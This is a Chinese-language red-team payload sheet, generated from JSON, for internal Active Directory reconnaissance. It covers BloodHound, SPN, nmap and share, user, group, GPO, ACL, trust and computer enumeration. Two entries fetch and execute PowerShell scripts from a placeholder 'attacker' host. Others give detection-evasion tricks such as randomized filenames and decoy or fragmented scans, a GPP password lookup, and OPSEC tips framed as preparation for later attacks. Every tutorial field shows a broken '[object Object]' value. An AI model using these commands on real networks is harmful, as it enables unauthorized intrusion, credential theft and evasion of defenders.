# 信息收集 — 内网渗透 payload

> 来源：src-hunter `references/payloader/raw/intranet.json`（12 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. BloodHound域分析

- **id:** `bloodhound-enumeration`
- **分类:** 信息收集 / 域分析
- **tags:** `bloodhound` `active-directory` `enumeration` `neo4j`

使用BloodHound分析Active Directory攻击路径

**前置条件**

- 域环境
- 域用户凭证
- BloodHound工具

**利用步骤**

#### SharpHound采集

```
SharpHound.exe -c All
```

使用SharpHound采集域信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `SharpHound.exe` | BloodHound数据采集工具 | command |
| `-c All` | 采集所有类型的数据 | parameter |

> platform: `windows`

#### PowerShell采集

```
IEX(New-Object Net.WebClient).DownloadString("http://attacker/SharpHound.ps1"); Invoke-BloodHound -CollectionMethod All
```

通过PowerShell远程加载采集

| 片段 | 说明 | 类型 |
|---|---|---|
| `Invoke-BloodHound` | PowerShell版本的采集命令 | command |
| `-CollectionMethod` | 指定采集方法 | parameter |

> platform: `windows`

#### bloodhound-python

```
bloodhound-python -u user -p password -d target.com -ns dc_ip
```

使用Python版本采集

| 片段 | 说明 | 类型 |
|---|---|---|
| `bloodhound-python` | Python版BloodHound采集器 | command |
| `-u` | 用户名 | parameter |
| `-d` | 域名 | parameter |
| `-ns` | 域名服务器 | parameter |

> platform: `linux`

#### 指定域控制器

```
SharpHound.exe -c All --LdapUsername user --LdapPassword pass --DomainController dc.target.com
```

指定域控制器采集

| 片段 | 说明 | 类型 |
|---|---|---|
| `--LdapUsername` | LDAP认证用户名 | parameter |
| `--DomainController` | 指定域控制器 | parameter |

> platform: `windows`

#### 启动Neo4j

```
sudo neo4j console
```

启动Neo4j数据库

> platform: `linux`

#### Cypher查询域管

```
MATCH (n:User) WHERE n.admincount=true RETURN n
```

查询域管理员用户

#### 查询攻击路径

```
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p
```

查询到域管理员的最短路径

**EDR 绕过**

#### 隐蔽采集

```
SharpHound.exe -c All --LdapUsername user --LdapPassword pass --OutputDirectory C:\Users\Public --RandomizeFilenames
```

随机化文件名避免检测

**OPSEC**

- BloodHound采集会产生大量LDAP查询
- 可能触发域控制器告警
- 建议在非工作时间执行

**教程**

[object Object]

---

### 2. SPN扫描

- **id:** `spn-scan`
- **分类:** 信息收集 / SPN
- **tags:** `spn` `kerberos` `enumeration`

扫描域内服务主体名称

**前置条件**

- 域环境
- 任意域用户凭证

**利用步骤**

#### 查询所有SPN

```
setspn -T domain.com -Q */*
```

查询域内所有SPN

| 片段 | 说明 | 类型 |
|---|---|---|
| `setspn` | Service Principal Name工具 | command |
| `-T` | 指定域 | parameter |
| `-Q` | 查询模式 | parameter |

> platform: `windows`

#### PowerShell查询

```
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
```

PowerShell查询SPN用户

| 片段 | 说明 | 类型 |
|---|---|---|
| `Get-ADUser` | 获取AD用户命令 | command |
| `-Filter` | 过滤条件 | parameter |
| `-Properties` | 返回的属性 | parameter |

> platform: `windows`

#### Impacket查询

```
GetUserSPNs.py domain/user:password -dc-ip dc_ip
```

Impacket查询SPN

| 片段 | 说明 | 类型 |
|---|---|---|
| `GetUserSPNs.py` | Impacket SPN查询工具 | command |
| `-dc-ip` | 域控制器IP | parameter |

> platform: `linux`

#### 查询特定服务

```
setspn -T domain.com -Q HTTP/*
```

查询HTTP服务的SPN

> platform: `windows`

#### 查找SQL服务

```
setspn -T domain.com -Q MSSQLSvc/*
```

查询MSSQL服务的SPN

> platform: `windows`

**OPSEC**

- SPN查询是正常的域操作
- 不会触发明显告警
- 可用于后续Kerberoasting攻击

**教程**

[object Object]

---

### 3. 内网端口扫描

- **id:** `port-scan`
- **分类:** 信息收集 / 端口扫描
- **tags:** `nmap` `port-scan` `enumeration`

内网端口扫描与服务识别

**前置条件**

- 内网访问权限
- 扫描工具

**利用步骤**

#### 快速扫描

```
nmap -sS -T4 -F 192.168.1.0/24
```

快速扫描常用端口

| 片段 | 说明 | 类型 |
|---|---|---|
| `-sS` | SYN扫描，半开放扫描 | parameter |
| `-T4` | 扫描速度模板(0-5) | parameter |
| `-F` | 快速模式，只扫常用端口 | parameter |

> platform: `linux`

#### 全端口扫描

```
nmap -sS -p- 192.168.1.1
```

扫描所有65535端口

| 片段 | 说明 | 类型 |
|---|---|---|
| `-p-` | 扫描所有端口(1-65535) | parameter |

> platform: `linux`

#### 服务识别

```
nmap -sV -sC 192.168.1.1
```

服务版本探测和脚本扫描

| 片段 | 说明 | 类型 |
|---|---|---|
| `-sV` | 服务版本探测 | parameter |
| `-sC` | 使用默认脚本扫描 | parameter |

> platform: `linux`

#### 内网存活探测

```
nmap -sn 192.168.1.0/24
```

Ping扫描发现存活主机

| 片段 | 说明 | 类型 |
|---|---|---|
| `-sn` | Ping扫描，不进行端口扫描 | parameter |

> platform: `linux`

#### Masscan快速扫描

```
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

高速端口扫描

| 片段 | 说明 | 类型 |
|---|---|---|
| `masscan` | 高速端口扫描工具 | command |
| `--rate` | 扫描速率(包/秒) | parameter |

> platform: `linux`

#### 操作系统识别

```
nmap -O 192.168.1.1
```

识别目标操作系统

| 片段 | 说明 | 类型 |
|---|---|---|
| `-O` | 操作系统探测 | parameter |

> platform: `linux`

#### UDP扫描

```
nmap -sU --top-ports 20 192.168.1.1
```

扫描常用UDP端口

| 片段 | 说明 | 类型 |
|---|---|---|
| `-sU` | UDP扫描 | parameter |
| `--top-ports` | 扫描最常用的N个端口 | parameter |

> platform: `linux`

#### 漏洞扫描

```
nmap --script vuln 192.168.1.1
```

使用漏洞扫描脚本

| 片段 | 说明 | 类型 |
|---|---|---|
| `--script vuln` | 使用漏洞类别脚本 | parameter |

> platform: `linux`

**EDR 绕过**

#### 隐蔽扫描

```
nmap -sS -T2 -f --data-length 50 192.168.1.1
```

低速分片扫描，添加随机数据

#### 诱饵扫描

```
nmap -sS -D RND:10 192.168.1.1
```

使用诱饵IP混淆扫描来源

**OPSEC**

- 高速扫描可能触发IDS告警
- 建议使用较低速率
- 分时段进行扫描

**教程**

[object Object]

---

### 4. 域信息收集

- **id:** `domain-recon`
- **分类:** 信息收集 / 域信息
- **tags:** `active-directory` `domain` `enumeration`

Active Directory域环境信息收集

**前置条件**

- 域环境
- 任意域用户凭证

**利用步骤**

#### 域信息

```
net config workstation
```

获取域信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `net config` | 显示配置信息 | command |
| `workstation` | 工作站配置 | value |

> platform: `windows`

#### 域控制器

```
nltest /dclist:domain.com
```

列出域控制器

| 片段 | 说明 | 类型 |
|---|---|---|
| `nltest` | Windows域工具 | command |
| `/dclist` | 列出域控制器 | parameter |

> platform: `windows`

#### 域用户

```
net user /domain
```

列出域用户

| 片段 | 说明 | 类型 |
|---|---|---|
| `net user` | 用户管理命令 | command |
| `/domain` | 指定域环境 | parameter |

> platform: `windows`

#### 域管理员

```
net group "Domain Admins" /domain
```

列出域管理员组

> platform: `windows`

#### 域信任关系

```
nltest /domain_trusts
```

列出域信任关系

> platform: `windows`

#### PowerView收集

```
IEX(New-Object Net.WebClient).DownloadString("http://attacker/PowerView.ps1"); Get-NetDomain
```

使用PowerView收集域信息

> platform: `windows`

#### 获取域策略

```
Get-DomainPolicy
```

获取域密码策略

> platform: `windows`

#### 获取域控制器

```
Get-NetDomainController
```

获取域控制器信息

> platform: `windows`

**OPSEC**

- 域信息收集是正常操作
- 不会触发明显告警
- 为后续攻击做准备

**教程**

[object Object]

---

### 5. 网络信息收集

- **id:** `network-recon`
- **分类:** 信息收集 / 网络信息
- **tags:** `network` `enumeration` `topology`

内网网络拓扑和配置信息收集

**前置条件**

- 内网访问权限

**利用步骤**

#### 网络配置

```
ipconfig /all
```

查看网络配置

| 片段 | 说明 | 类型 |
|---|---|---|
| `ipconfig` | 网络配置命令 | command |
| `/all` | 显示详细信息 | parameter |

> platform: `windows`

#### 路由表

```
route print
```

查看路由表

> platform: `windows`

#### ARP缓存

```
arp -a
```

查看ARP缓存

> platform: `windows`

#### 网络连接

```
netstat -ano
```

查看网络连接

| 片段 | 说明 | 类型 |
|---|---|---|
| `netstat` | 网络统计命令 | command |
| `-a` | 显示所有连接 | parameter |
| `-n` | 以数字形式显示地址 | parameter |
| `-o` | 显示进程ID | parameter |

> platform: `windows`

#### DNS缓存

```
ipconfig /displaydns
```

查看DNS缓存

> platform: `windows`

#### Linux网络配置

```
ifconfig -a
```

Linux查看网络配置

> platform: `linux`

#### Linux路由表

```
route -n
```

Linux查看路由表

> platform: `linux`

#### traceroute

```
tracert target_ip
```

追踪路由

> platform: `windows`

**OPSEC**

- 这些是正常的网络管理命令
- 不会触发告警
- 为后续横向移动做准备

**教程**

[object Object]

---

### 6. 共享枚举

- **id:** `share-enum`
- **分类:** 信息收集 / 共享
- **tags:** `smb` `share` `enumeration`

枚举网络共享资源

**前置条件**

- 内网访问权限

**利用步骤**

#### 枚举共享

```
net share
```

查看本地共享

> platform: `windows`

#### 查看远程共享

```
net view \\target_ip
```

查看远程机器共享

> platform: `windows`

#### SMBMap枚举

```
smbmap -H target_ip -u user -p password
```

使用SMBMap枚举共享

| 片段 | 说明 | 类型 |
|---|---|---|
| `smbmap` | SMB共享枚举工具 | command |
| `-H` | 目标主机 | parameter |

> platform: `linux`

#### CrackMapExec枚举

```
crackmapexec smb target_ip -u user -p password --shares
```

使用CME枚举共享

| 片段 | 说明 | 类型 |
|---|---|---|
| `crackmapexec smb` | CME SMB模块 | command |
| `--shares` | 枚举共享 | parameter |

> platform: `linux`

#### smbclient枚举

```
smbclient -L target_ip -U user%password
```

使用smbclient枚举

| 片段 | 说明 | 类型 |
|---|---|---|
| `smbclient` | SMB客户端工具 | command |
| `-L` | 列出共享 | parameter |

> platform: `linux`

#### PowerView枚举

```
Find-InterestingDomainShareFile
```

查找有趣的共享文件

> platform: `windows`

**OPSEC**

- 共享枚举是正常操作
- 可能发现敏感文件
- 注意文件访问日志

**教程**

[object Object]

---

### 7. 用户枚举

- **id:** `user-enum`
- **分类:** 信息收集 / 用户
- **tags:** `user` `enumeration` `active-directory`

枚举域内用户信息

**前置条件**

- 域环境
- 任意域用户凭证

**利用步骤**

#### 列出域用户

```
net user /domain
```

列出所有域用户

> platform: `windows`

#### 用户详细信息

```
net user username /domain
```

查看用户详细信息

> platform: `windows`

#### PowerView枚举

```
Get-NetUser | select samaccountname,description,admincount
```

使用PowerView枚举用户

> platform: `windows`

#### 查找管理员

```
Get-NetUser -AdminCount | select samaccountname
```

查找域管理员

> platform: `windows`

#### 查找活跃用户

```
Get-NetUser | Where-Object {$_.lastlogon -gt (Get-Date).AddDays(-30)}
```

查找最近登录的用户

> platform: `windows`

#### Impacket枚举

```
GetADUsers.py -all domain/user:password -dc-ip dc_ip
```

使用Impacket枚举域用户

> platform: `linux`

**OPSEC**

- 用户枚举是正常操作
- 为后续攻击选择目标
- 注意识别蜜罐账户

**教程**

[object Object]

---

### 8. 组枚举

- **id:** `group-enum`
- **分类:** 信息收集 / 组
- **tags:** `group` `enumeration` `active-directory`

枚举域内组信息

**前置条件**

- 域环境
- 任意域用户凭证

**利用步骤**

#### 列出域组

```
net group /domain
```

列出所有域组

> platform: `windows`

#### 组成员

```
net group "Domain Admins" /domain
```

查看域管理员组成员

> platform: `windows`

#### PowerView枚举

```
Get-NetGroup | select samaccountname,admincount
```

使用PowerView枚举组

> platform: `windows`

#### 查找高权限组

```
Get-NetGroup -AdminCount | select samaccountname
```

查找高权限组

> platform: `windows`

#### 组成员关系

```
Get-NetGroupMember "Domain Admins" | select membername
```

获取组成员

> platform: `windows`

#### 递归组成员

```
Get-NetGroupMember "Domain Admins" -Recurse
```

递归获取组成员（包括嵌套组）

> platform: `windows`

**OPSEC**

- 组枚举是正常操作
- 重点关注高权限组
- 注意嵌套组关系

**教程**

[object Object]

---

### 9. GPO枚举

- **id:** `gpo-enum`
- **分类:** 信息收集 / GPO
- **tags:** `gpo` `group-policy` `enumeration`

枚举组策略对象

**前置条件**

- 域环境
- 任意域用户凭证

**利用步骤**

#### 列出GPO

```
Get-GPO -All
```

列出所有GPO

> platform: `windows`

#### PowerView枚举

```
Get-NetGPO | select displayname,whencreated
```

使用PowerView枚举GPO

> platform: `windows`

#### GPO权限

```
Get-NetGPOGroup
```

查找GPO中的受限组

> platform: `windows`

#### GPP密码

```
Get-NetGPPPassword
```

查找GPP中的密码

> platform: `windows`

#### 查找可利用GPO

```
Find-GPOLocation -UserName user
```

查找用户受哪些GPO影响

> platform: `windows`

**OPSEC**

- GPP密码是常见的信息泄露点
- GPO可能包含敏感配置
- 注意GPO修改权限

**教程**

[object Object]

---

### 10. ACL枚举

- **id:** `acl-enum`
- **分类:** 信息收集 / ACL
- **tags:** `acl` `access-control` `enumeration`

枚举访问控制列表

**前置条件**

- 域环境
- 任意域用户凭证

**利用步骤**

#### PowerView ACL枚举

```
Get-ObjectAcl -SamAccountName user -ResolveGUIDs
```

获取用户对象的ACL

> platform: `windows`

#### 查找危险权限

```
Find-InterestingDomainAcl -ResolveGUIDs
```

查找有趣的ACL权限

> platform: `windows`

#### 查找WriteDACL

```
Get-ObjectAcl -SamAccountName target -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*WriteDACL*"}
```

查找WriteDACL权限

> platform: `windows`

#### 查找GenericAll

```
Get-ObjectAcl -SamAccountName target -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}
```

查找GenericAll权限

> platform: `windows`

#### BloodHound ACL分析

```
MATCH (n)-[r:AllExtendedRights]->(m) RETURN n,m
```

BloodHound查询ACL关系

**OPSEC**

- ACL错误配置是常见的提权路径
- 重点关注高价值目标
- BloodHound可可视化ACL关系

**教程**

[object Object]

---

### 11. 信任关系枚举

- **id:** `trust-enum`
- **分类:** 信息收集 / 信任关系
- **tags:** `trust` `enumeration` `active-directory`

枚举域信任关系

**前置条件**

- 域环境
- 任意域用户凭证

**利用步骤**

#### 域信任关系

```
nltest /domain_trusts
```

列出域信任关系

> platform: `windows`

#### PowerView枚举

```
Get-NetDomainTrust
```

使用PowerView枚举信任关系

> platform: `windows`

#### 森林信任

```
Get-NetForestTrust
```

枚举森林信任关系

> platform: `windows`

#### 信任详细信息

```
Get-NetDomainTrust | select SourceDomain,TargetDomain,TrustType,TrustDirection
```

查看信任详细信息

> platform: `windows`

**OPSEC**

- 信任关系可能提供跨域攻击路径
- 关注双向信任
- 注意SID历史问题

**教程**

[object Object]

---

### 12. 计算机枚举

- **id:** `computer-enum`
- **分类:** 信息收集 / 计算机
- **tags:** `computer` `enumeration` `active-directory`

枚举域内计算机

**前置条件**

- 域环境
- 任意域用户凭证

**利用步骤**

#### 列出域计算机

```
net group "Domain Computers" /domain
```

列出域计算机

> platform: `windows`

#### PowerView枚举

```
Get-NetComputer | select name,operatingsystem,ipv4address
```

使用PowerView枚举计算机

> platform: `windows`

#### 查找域控制器

```
Get-NetComputer -DomainController
```

查找域控制器

> platform: `windows`

#### 查找特定系统

```
Get-NetComputer -OperatingSystem "*Server 2019*"
```

查找特定操作系统

> platform: `windows`

#### 查找活跃计算机

```
Get-NetComputer -Ping
```

查找在线计算机

> platform: `windows`

#### 查找管理员会话

```
Find-DomainUserLocation
```

查找域管理员登录位置

> platform: `windows`

**OPSEC**

- 计算机枚举是正常操作
- 重点关注域控制器和服务器
- 查找管理员会话

**教程**

[object Object]
